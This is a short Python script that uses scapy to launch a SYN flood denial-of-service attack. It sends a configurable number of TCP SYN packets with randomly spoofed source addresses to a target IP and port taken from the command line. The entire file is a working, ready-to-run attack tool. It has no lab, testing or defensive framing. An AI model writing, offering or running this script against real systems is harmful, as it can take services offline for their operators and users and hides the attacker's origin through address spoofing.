from scapy.all import IP, TCP, send
import random
import argparse
import time

def syn_flood(target_ip, target_port, packet_count):
    print(f"[SYN FLOOD] Sending {packet_count} packets to {target_ip}:{target_port}")
    for i in range(packet_count):
        ip = IP(dst=target_ip, src=".".join(str(random.randint(1,254)) for _ in range(4)))
        tcp = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
        packet = ip / tcp
        send(packet, verbose=False)
    print("[SYN FLOOD] Done!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target", required=True, help="Target IP")
    parser.add_argument("-p","--port", default=80, type=int, help="Port")
    parser.add_argument("-n","--number", default=1000, type=int, help="Packet count")
    args = parser.parse_args()
    syn_flood(args.target, args.port, args.number)
